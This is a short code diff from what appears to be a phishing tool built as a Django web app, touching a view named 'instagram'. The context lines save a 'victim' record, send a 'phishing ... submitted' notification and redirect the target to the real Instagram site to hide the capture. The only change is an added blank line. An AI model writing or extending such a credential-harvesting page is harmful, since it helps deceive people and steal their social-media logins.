@@ -138,4 +138,5 @@ def instagram(request):
         victim.save()
         push(f'phishing -- {request.user} -- submitted')
         return redirect('https://www.instagram.com')
+        
     return render(request, 'projects/instagram.html')
